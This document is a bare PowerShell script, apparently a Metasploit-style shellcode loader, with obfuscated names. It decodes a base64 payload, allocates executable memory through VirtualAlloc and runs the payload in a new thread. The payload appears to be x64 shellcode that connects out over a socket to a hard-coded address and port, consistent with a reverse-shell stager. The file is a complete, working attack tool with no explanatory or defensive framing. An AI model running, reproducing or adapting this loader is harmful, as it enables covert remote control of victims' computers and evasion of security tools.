function y__fsC0d {
	Param ($z03iPz9yAEZj, $upCx7)		
	$jOeHdcuh = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $jOeHdcuh.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jOeHdcuh.GetMethod('GetModuleHandle')).Invoke($null, @($z03iPz9yAEZj)))), $upCx7))
}

function hwd6eOIJ {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $n2xQT,
		[Parameter(Position = 1)] [Type] $f7UxGpjE = [Void]
	)
	
	$hWQiZHiZuqG = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$hWQiZHiZuqG.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $n2xQT).SetImplementationFlags('Runtime, Managed')
	$hWQiZHiZuqG.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $f7UxGpjE, $n2xQT).SetImplementationFlags('Runtime, Managed')
	
	return $hWQiZHiZuqG.CreateType()
}

[Byte[]]$xvhmJD0bLC = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFdrBgOc0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$jeShJharju = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y__fsC0d kernel32.dll VirtualAlloc), (hwd6eOIJ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $xvhmJD0bLC.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($xvhmJD0bLC, 0, $jeShJharju, $xvhmJD0bLC.length)

$cD4CTA2Pr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y__fsC0d kernel32.dll CreateThread), (hwd6eOIJ @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jeShJharju,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((y__fsC0d kernel32.dll WaitForSingleObject), (hwd6eOIJ @([IntPtr], [Int32]))).Invoke($cD4CTA2Pr,0xffffffff) | Out-Null